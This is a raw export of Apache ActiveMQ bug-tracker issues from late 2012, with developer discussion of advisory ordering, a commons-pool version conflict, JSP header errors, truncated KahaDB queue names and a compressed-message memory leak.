Can you please point to the code paths for (a) the removal of consumers in the ""normal, respond to advisories approach"" and, (b) the dispatching in a single thread?;;;","03/Dec/12 23:15;ceposta;Art,

for (b), remove consumer (for a temp) and remove destination (for a temp) can only come from one place (the connection it originated from), ie, another connection cannot remove the temp or the consumer to the temp. When that connection makes a call to remove the consumer for the temp, the thread that handles it for that connection handles the remove in the broker and sends to the advisory topic as well as sends to the subscription for the advisory topic. Topics don't have a separate ""dispatch thread"" like queues do, so the ordering for this case cannot race. The same thread that handled the connection is also used in the TopicSubscription. If there were two separate connections involved with sending the remove info and remove destination, then there could be a race. 

The only other thread involved is the thread for the consumer's connection. When a topic sub dispatches to the consumer's connection it will do this by default async. So it will be put into a ""worker queue"" for the connection thread to finally send it over the wire. but the messages are put there by the same thread and in order for this async dispatch. 

If i've mispoken, I'm open to corrections :);;;","04/Dec/12 17:51;artnaseef;Only 1 dispatch thread for all Topics?  Then what were all those leaked threads we came across as one of the consequences of this consumer leak?  We had threads for every temporary topic and for every advisory destination.

Also, what is wrong with adding the more robust solution that makes sure that no consumers ever linger after deletion of the temporary destination?  That is a nice, clean, easy-to-verify fix that should eliminate all possible causes of an issue - unless somehow a consumer gets created without attaching to the temporary destination.  I'm all for fixing the cause by serializing the operations as well, but I see 0 downside to this more robust fix.

Oh, and btw - shouldn't the DestinationInfo get copied in Gary's patch since it's being processed asynchronously, and changes to the object could lead to Null Pointer Exceptions?

Robust please.  I  need ActiveMQ to stop having so many problems.;;;","04/Dec/12 18:26;ceposta;@Arthur
{quote}
Only 1 dispatch thread for all Topics? Then what were all those leaked threads we came across as one of the consequences of this consumer leak? We had threads for every temporary topic and for every advisory destination.
{quote}

Yes, that's correct. There is a thread for the topic, but it's used for dispatching messages that were set aside because of producer flow control when sent with a producer window or sent synchronous. That's the only purpose for that thread. It does not dispatch the messages in normal cases. Even in the PFC case, it will not race because the Usage#usageMutex would allow the messages waiting for space to fire first before any new messages are sent.

However, I agree to the extent that consumers to temporary destinations should be tied to the life of the temporary destination (whether a network sub or real sub). In other words, if somehow there is a consumer for a temp dest around when the temp dest is being removed, then that consumer too should be removed. 

I think Gary's patch will enforce this at the bridge level, but further assurances should be fine.


;;;","04/Dec/12 18:49;artnaseef;So, the brokers guarantee ordering across more than 1 Topic?

The following can never happen - even if PFC is hit on on Topic?

- subscription S to composite ActiveMQ.Advisory.TempTopic,ActiveMQ.Advisory.Consumer.>
- message A produced to ActiveMQ.Advisory.TempTopic
- message B produced to ActiveMQ.Advisory.Consumer.ID:xyz
- message B consumed by S
- message A consumed by S

In other words, once the ActiveMQ.Advisory.TempTopic destination hits PFC, dispatches to ActiveMQ.Advisory.Consumer.ID:xyz will block as well?

This is starting to shed light on potential circumstances under which I was seeing more out-or-order processing issues.;;;","04/Dec/12 19:27;gtully;@Arthur - please build the test case. If there is need for a further fix (demonstrated by a concrete test case) we can do it.

There is no ordering guarantee (across topics) in general but for advisories, pfc is disabled, and all dispatch is async such that a send never blocks, so each sub has guaranteed ordering. The network bridges depend on this behavior.;;;","04/Dec/12 19:43;artnaseef;Alright.  Just keep in mind that I'm tired of providing concrete test cases for issues that aren't getting fixed.  So, I'm going to stop doing so if they don't start yielding results.

For example, I still have (> 1 year now) issues with transacted sends failing and the clients never notice.

And then there's the partner to this issue in which a request message with JMSReplyTo = temp topic sent across a network of brokers, the producer can actually start sending messages before it's broker knows of the existence of the temporary destination.

So, when I produce a concerete test case for this, I expect immediate action.;;;","10/Dec/12 18:48;artnaseef;I ran tests with a broker filter designed to detect out-of-order operations on temporary destinations.  It ran into a problem in which one broker in the network saw a ""DELETE DESTINATION"" first rather than the ""CREATE DESTINATION"".

Digging into that problem resulted in finding a problem resolved as a part of the changes in AMQ-3253 (copying the DestinationInfo before sending in an advisory).

After applying that fix, I'm not seeing out-of-order operations, with the exception of occassional ""destination ... does not exist"" errors when using a temporary destination as the JMSReplyTo address due to a race between the request message and the temp advisories.

Note that this thread has been very illuminating.  PFC doesn't really handle all of the cases I thought it would handle, and that needs careful consideration.

Lists of ""what does ActiveMQ guarantee"" (with a broker network and without), and ""what ActiveMQ does not guarantee"" would be extremely useful.;;;","10/Dec/12 21:09;gtully;that is good news. 
One thought, if you are getting a race between messages with replyTo and temp destination creation/propagation via advisories, ensure that the network bridge that propagates the target destination of the request message is also the bridge that propagates temp destinations. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-admin bstat command predefined query isn't even run,AMQ-4195,12618029,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,ceposta,ceposta,ceposta,28/Nov/12 18:26,28/Nov/12 18:30,14/Jul/23 05:43,28/Nov/12 18:30,5.7.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"The output for ""bstat"" and the ""query command without any params"" are exactly the same for activemq-admin. This is because the query intended to be run for bstat is never run. 

A closer look shows that the parameters passed to the runTask() method of QueryCommand are never used. The QueryCommand.queryAddObjects field is what's used to determine what objects to query and for the bstat command, those are never properly parsed. ",,ceposta,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,292631,,,Wed Nov 28 18:30:24 UTC 2012,,,,,,,,,,,"0|i0s9sv:",163064,,,,,,,,,,,,,,,,,,,,,"28/Nov/12 18:30;ceposta;Fixed with r1414852;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PooledConnectionFactory with JmsTemplate results in MalformedParameterizedTypeException,AMQ-4189,12617693,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,pragadeesh,pragadeesh,26/Nov/12 21:24,05/Dec/12 21:59,14/Jul/23 05:43,05/Dec/12 21:56,5.7.0,,,,,,,,Pool,,,,3,,,,,,,,,"  <!-- JMS ConnectionFactory to use, configuring the embedded broker using XML -->
  <amq:connectionFactory id=""jmsFactory"" brokerURL=""vm://localhost""/>
  

  <!-- Spring JMS Template -->
  <bean id=""myJmsTemplate"" class=""org.springframework.jms.core.JmsTemplate"">
    <property name=""connectionFactory"">
      <!-- lets wrap in a pool to avoid creating a connection per send -->
      <bean class=""org.springframework.jms.connection.SingleConnectionFactory"">
        <property name=""targetConnectionFactory"">
          <ref local=""jmsFactory"" />
        </property>
      </bean>
    </property>
  </bean>

here if we use org.apache.activemq.pool.PooledConnectionFactory  instead of org.springframework.jms.connection.SingleConnectionFactory, 

we are receiving org.springframework.beans.factory.BeanCreationException: Initialization of bean failed; nested exception is java.lang.reflect.MalformedParameterizedTypeException 

We got this when we upgraded from ActiveMQ 5.4 to 5.7","Tomcat 7.0.27
Spring 3.1.2",andreaja,jiri.patera,kaaveland,nvilmer,pragadeesh,robinsk,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Nov/12 17:09;pragadeesh;ConnectionPoolTest.java;https://issues.apache.org/jira/secure/attachment/12555530/ConnectionPoolTest.java","30/Nov/12 17:09;pragadeesh;jms-local-test.xml;https://issues.apache.org/jira/secure/attachment/12555531/jms-local-test.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,292207,,,Wed Dec 05 21:59:55 UTC 2012,,,,,,,,,,,"0|i0rsjb:",160267,,,,,,,,,,,,,,,,,,,,,"28/Nov/12 23:42;nvilmer;I am having the same issue;;;","30/Nov/12 11:59;robinsk;We had the same issue, and found it to be a version mismatch (transitive dependencies, ahoy!) between commons-pool 1.4 (used by commons-dbcp) and 1.7 (used by activemq-pool). Solved it by excluding commons-pool from the commons-dbcp dependency.

Not saying that this is a proper fix/workaround, or even related to your issues, but it worked for us. Watching this issue to see what the amq guys will say.;;;","30/Nov/12 15:45;tabish;Can you put together a little unit test to show the problem, we can take a look.;;;","30/Nov/12 17:09;pragadeesh;Attached are spring xml config file and just a simple junit test. It does not test anything. You will be able to see the issue when you actually run the test during loading application context. I have also included the code for singleConnectionFactory (commented out in xml) which runs successfully. 

Junit4; Spring 3.1 and ActiveMQ 5.7

Stack trace: 
java.lang.IllegalStateException: Failed to load ApplicationContext
	at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:157)
	at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:109)
	at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:75)
	at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:321)
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.createTest(SpringJUnit4ClassRunner.java:211)
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner$1.runReflectiveCall(SpringJUnit4ClassRunner.java:288)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.methodBlock(SpringJUnit4ClassRunner.java:290)
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:231)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:49)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:193)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:52)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:191)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:42)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:184)
	at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61)
	at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:71)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:236)
	at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:174)
	at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
	at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'jmsPooledConnectionFactory' defined in class path resource [spring/jms-local-test.xml]: Initialization of bean failed; nested exception is java.lang.reflect.MalformedParameterizedTypeException
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:527)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:294)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:225)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:193)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:609)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:469)
	at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:103)
	at org.springframework.test.context.support.AbstractGenericContextLoader.loadContext(AbstractGenericContextLoader.java:1)
	at org.springframework.test.context.support.DelegatingSmartContextLoader.loadContext(DelegatingSmartContextLoader.java:228)
	at org.springframework.test.context.TestContext.loadApplicationContext(TestContext.java:124)
	at org.springframework.test.context.TestContext.getApplicationContext(TestContext.java:148)
	... 24 more
Caused by: java.lang.reflect.MalformedParameterizedTypeException
	at sun.reflect.generics.reflectiveObjects.ParameterizedTypeImpl.validateConstructorArguments(ParameterizedTypeImpl.java:42)
	at sun.reflect.generics.reflectiveObjects.ParameterizedTypeImpl.<init>(ParameterizedTypeImpl.java:35)
	at sun.reflect.generics.reflectiveObjects.ParameterizedTypeImpl.make(ParameterizedTypeImpl.java:77)
	at sun.reflect.generics.factory.CoreReflectionFactory.makeParameterizedType(CoreReflectionFactory.java:86)
	at sun.reflect.generics.visitor.Reifier.visitClassTypeSignature(Reifier.java:122)
	at sun.reflect.generics.tree.ClassTypeSignature.accept(ClassTypeSignature.java:31)
	at sun.reflect.generics.repository.MethodRepository.getReturnType(MethodRepository.java:50)
	at java.lang.reflect.Method.getGenericReturnType(Method.java:236)
	at org.springframework.core.GenericTypeResolver.resolveReturnType(GenericTypeResolver.java:98)
	at org.springframework.beans.GenericTypeAwarePropertyDescriptor.getPropertyType(GenericTypeAwarePropertyDescriptor.java:129)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.isExcludedFromDependencyCheck(AbstractAutowireCapableBeanFactory.java:1269)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.filterPropertyDescriptorsForDependencyCheck(AbstractAutowireCapableBeanFactory.java:1245)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1101)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:517)
	... 37 more
;;;","30/Nov/12 17:25;pragadeesh;[~robinsk]
We were using commons-pool 1.5.4 and when I replaced it with 1.6, we are not getting the issue anymore. But, I am concerned as per your comment that this could just be a temporary fix.

when using the above, I have run into the following issue that was supposedly fixed in 5.4.2  -  org.apache.activemq.transport.TransportDisposedIOException
I found the below issue logged in this forum

 https://issues.apache.org/jira/browse/AMQ-2902;;;","30/Nov/12 20:48;tabish;Ran the test with a 5.8-SNAPSHOT build an everything seems fine. ;;;","30/Nov/12 20:54;pragadeesh;It works in the test. But, 2902 - org.apache.activemq.transport.TransportDisposedIOException occurs while shutting down the application in TC server.
Also, 5.8 is an unreleased version and we cant use it in production yet;;;","30/Nov/12 21:06;tabish;You can submit a better unit test that can be added in activemq-spring we can make sure things get fixed up for the v5.8 release. ;;;","30/Nov/12 21:11;pragadeesh;Thanks Timothy. I appreciate your help.
Is there a way I can get 5.8 version to test at my end;;;","30/Nov/12 21:36;tabish;Grab the latest one from the SNAPSHOT repo:
https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.8-SNAPSHOT/;;;","05/Dec/12 14:45;jiri.patera;I can see that the {{activemq-pool}} artifact depends on the {{commons-pool:1.6}} artifact:

{code}
[INFO] +- org.apache.activemq:activemq-pool:jar:5.7.0:compile
[INFO] |  +- org.slf4j:slf4j-api:jar:1.6.6:compile
[INFO] |  +- org.apache.activemq:activemq-core:jar:5.7.0:compile
[INFO] |  +- org.apache.geronimo.specs:geronimo-jta_1.0.1B_spec:jar:1.0.1:compile
[INFO] |  \- commons-pool:commons-pool:jar:1.6:compile
{code}

What happened in our case was that in the project we had the {{commons-pool:1.5.4}} artifact placed closer to the dependency tree root and, thus, it was winning:

{code}
<dependencies>
  <dependency>
    <groupId>org.apache.activemq</groupId>
    <artifactId>activemq-pool</artifactId>
    <version>5.7.0</version>
  </dependency>
  <dependency>
    <groupId>commons-pool</groupId>
    <artifactId>commons-pool</artifactId>
    <version>1.5.4</version>
  </dependency>
</dependencies>
{code}

That produces the following dependency tree ({{mvn dependency:tree -Dverbose -Dincludes=:commons-pool:}}):

{code}
[INFO] com.gk-software.test:test-b:jar:1.0.0-SNAPSHOT
[INFO] +- org.apache.activemq:activemq-pool:jar:5.7.0:compile
[INFO] |  \- (commons-pool:commons-pool:jar:1.6:compile - omitted for conflict with 1.5.4)
[INFO] \- commons-pool:commons-pool:jar:1.5.4:compile
{code}

The problematic method is: 
{{public org.apache.commons.pool.ObjectPoolFactory org.apache.activemq.pool.PooledConnectionFactory.getPoolFactory()}}

Its return type is being inspected by the following method: {{org.springframework.core.GenericTypeResolver.resolveReturnType(Method, Class)}}

Which in turn calls Java Reflection API: {{method.getGenericReturnType()}}

And this produces the {{java.lang.reflect.MalformedParameterizedTypeException}} exception in case the {{commons-pool:1.5.4}} is on the classpath instead of the correct {{commons-pool:1.6}}. So the key difference between these two versions is [this change of the generic type|http://grepcode.com/file_/repo1.maven.org/maven2/commons-pool/commons-pool/1.5.4/org/apache/commons/pool/ObjectPoolFactory.java/?v=diff&id2=1.6].

So from my point of view this is not an issue of the {{activemq-pool}} artifact, but of a Maven dependency tree (or classpath) in the user's project.;;;","05/Dec/12 21:52;tabish;I don't see there's a whole lot we can do here as its more of an issue with the mixed versions being pulled in by this particular project configuration.  Can you update your project to use the commons-pool v1.6.0 ?;;;","05/Dec/12 21:54;pragadeesh;I have already done that. ;;;","05/Dec/12 21:56;pragadeesh;The issue was fixed by using commons-pool 1.6 with ActiveMQ 5.7;;;","05/Dec/12 21:59;tabish;ok, thanks for closing the loop on this. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
web-console xml views have duplicate contenttype headers - jsp errors,AMQ-4186,12617408,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,23/Nov/12 11:01,23/Nov/12 11:11,14/Jul/23 05:43,23/Nov/12 11:11,5.8.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"with the latest dependencies we get:{code}
2012-11-22 12:20:52,678 | WARN | qtp2848306-261 | ServletHandler | lipse.jetty.util.log.JavaUtilLog 70 | 121 - org.eclipse.jetty.util - 7.6.7.v20120910 | /activemqweb/xml/topics.jsp
org.apache.jasper.JasperException: /xml/topics.jsp(1,1) PWC5988: Page directive: illegal to have multiple occurrences of contentType with different values (old: text/html;charset=UTF-8, new: text/xml;charset=ISO-8859-1)
at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:78)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]
at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:373)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]
at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:201)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]
at org.apache.jasper.compiler.Validator$DirectiveVisitor.visit(Validator.java:171)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]
at org.apache.jasper.compiler.Node$PageDirective.accept(Node.java:599)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]
at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2291)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]
at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2341)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]{code}
The duplicate contentyType directive seems to only error out with the current jsp compiler.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,291848,,,Fri Nov 23 11:11:19 UTC 2012,,,,,,,,,,,"0|i0rh2v:",158410,,,,,,,,,,,,,,,,,,,,,"23/Nov/12 11:11;gtully;fix in http://svn.apache.org/viewvc?rev=1412825&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unable to access JMSXUserId,AMQ-4185,12617122,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,harisundhar,harisundhar,21/Nov/12 15:47,24/Jan/13 17:03,14/Jul/23 05:43,06/Dec/12 15:13,5.7.0,,,,,5.8.0,,,Camel,,,,0,,,,,,,,,"I have enabled in activemq.xml - <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""localhost"" useJmx=""true"" populateJMSXUserID=""true"" dataDirectory=""${activemq.data}"">

and trying get the property on the client when reading the topic

System.out.println(""text message id: ""+txtMsg.getObjectProperty(""JMSXUserID""));

I am not sure what I am missing..",Activemq-5.7.0,harisundhar,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4202,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,259322,,,Thu Jan 24 17:03:26 UTC 2013,,,,,,,,,,,"0|i0locn:",124595,,,,,,,,,,,,,,,,,,,,,"21/Nov/12 15:53;harisundhar;I chose activemq-camel, but it's more activemq-5.7.0. 
;;;","26/Nov/12 14:45;tabish;Can you provide a test case that demonstrates the problem?;;;","04/Dec/12 23:24;tabish;Can you try a recent 5.8-SNAPSHOT I think this is resolved now. ;;;","06/Dec/12 15:13;tabish;This should be fixed now as the property is listed in the connection metadata list of JMSX properties.;;;","24/Jan/13 16:58;harisundhar;How do I download the latest snapshot ?;;;","24/Jan/13 17:03;tabish;https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.8-SNAPSHOT/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ 5.7 lost long queue names with filteredKahaDB,AMQ-4183,12617003,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,alisenberg,alisenberg,20/Nov/12 20:28,12/Dec/12 15:42,14/Jul/23 05:43,12/Dec/12 15:42,5.7.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"Using AMQ 5.7 with filteredKahaDB and perDestination=""true"". I send persistent messages to a queue with a long name (more than 60 chars in the name). After broker restart this queue is not there anymore.

It seems that kahadb is generating a truncated directory for that queue. The directory name is missing first letters. For short queue names, directory start with something like ""queue#3a#2f#2f...."", but for long queue names directory start with ""#2f#2f..."".
","Linux, AMQ 5.7, KahaDB, filteredKahaDB, perDestination=""true"", long queueNames.",alisenberg,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,258919,,,Wed Dec 12 15:42:07 UTC 2012,,,,,,,,,,,"0|i0l5qv:",121581,,,,,,,,,,,,,,,,,,,,,"22/Nov/12 04:07;alisenberg;Setting system properties MaximumDirNameLength (defaults to 200) and MaximumFileNameLength (defaults to 64) to a higher value solved the problem. ;;;","26/Nov/12 14:08;tabish;Seems like a non-issue then.  ;;;","26/Nov/12 15:07;alisenberg;If you don't set those system properties and still use long queue names, then there is no warning or error alerting those queues will disappear after broker restart. One solution would be controlling the length of queue names while creating them and verifying against MaximumDirNameLength and MaximumFileNameLength.

adrian;;;","12/Dec/12 15:42;tabish;Added a warning to inform of name truncation in mKahaDB when filenames exceed the system property value;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory Leak for ActiveMQBytesMessage with Compression as true,AMQ-4182,12616950,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,jeff.huang,jeff.huang,20/Nov/12 15:42,23/Apr/14 10:59,14/Jul/23 05:43,23/Apr/14 10:59,5.5.1,,,,,5.10.0,,,JMS client,,,,0,,,,,,,,,"InflaterInputStream is supposed to close explicitly to release resource allocated by its JNI methods. In ActiveMQBytesMessage, dataIn property is disposed simply without closing it, which results in some weird memory leak that can't be detected from heap size. It can't be controlled by -Xmx or -XX:MaxDirectMemorySize.

Please run the following test program to verify the issue:

import java.util.concurrent.TimeUnit;

import javax.jms.BytesMessage;
import javax.jms.Connection;
import javax.jms.Session;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ActiveMQBytesMessage;

/**
 * A simple test to verify memory leak in ActiveMQBytesMessage.
 */
public class Main
{
    public static void main(String[] args) throws Exception 
    {
        ActiveMQConnectionFactory connFactory = new ActiveMQConnectionFactory(""vm://localhost"");
        connFactory.setUseCompression(true);
        Connection conn = connFactory.createConnection();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        BytesMessage message = session.createBytesMessage();
        
        message.writeBytes(new byte[1024]);

        ActiveMQBytesMessage m = (ActiveMQBytesMessage)message;
        if(!m.isCompressed())
        {
            throw new RuntimeException();
        }
        
        
        while (true)
        {
            for (int k = 0; k < 1024; ++k)
            {
                message.reset();
                byte[] data = new byte[1024];
                message.readBytes(data);
            }
            TimeUnit.MILLISECONDS.sleep(10);
        }
    }

}","Linux(Redhat 5.5), Windows 7",dejanb,jeff.huang,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,258841,,,Wed Apr 23 10:59:31 UTC 2014,,,,,,,,,,,"0|i0l4sn:",121427,,,,,,,,,,,,,,,,,,,,,"26/Nov/12 16:17;tabish;Added some additional logic to attempt to close the dataIn stream when possible.;;;","29/Nov/12 02:57;jeff.huang;I read the changes. Fix in reset() is good I believe. But I am worried about the finalize() method because I don't think it would work as good as we would expect. Please take a look at how Sun's JDK 1.6 implemented java.util.zip.Inflater

336     /**
337      * Closes the decompressor and discards any unprocessed input.
338      * This method should be called when the decompressor is no longer
339      * being used, but will also be called automatically by the finalize()
340      * method. Once this method is called, the behavior of the Inflater
341      * object is undefined.
342      */
343     public void end() {
344         synchronized (zsRef) {
345             long addr = zsRef.address();
346             zsRef.clear();
347             if (addr != 0) {
348                 end(addr);
349                 buf = null;
350             }
351         }
352     }
353
354     /**
355      * Closes the decompressor when garbage is collected.
356      */
357     protected void finalize() {
358         end();
359     }

They have already done finalize() with end(). So if finalize() works well, the problem wouldn't exist in the first place. And since those memory is allocated out of JVM heap, the GC could have problem to sense the necessity to clean something even the system blows out.;;;","29/Nov/12 03:58;jeff.huang;Please try to run the test program with -Xmx10M, -X128M, and -X2G, and monitor the JVM memory usage. Here are the results in my own test system with 8G memory when it was stable:

-Xmx10M
  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
15070 root      17   0  429m 123m 9856 S 80.2  1.5   0:48.49 java   

-Xmx128M
  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
15115 root      17   0 2808m 2.0g 9856 S 78.6 26.0   0:22.70 java

-X2G
Never stable and the whole system just ran out of memory.

That means when -Xmx is big enough for holding NORMAL objects the GC just won't see the memory problem at all, which results in the finalize() method won't be executed ever.
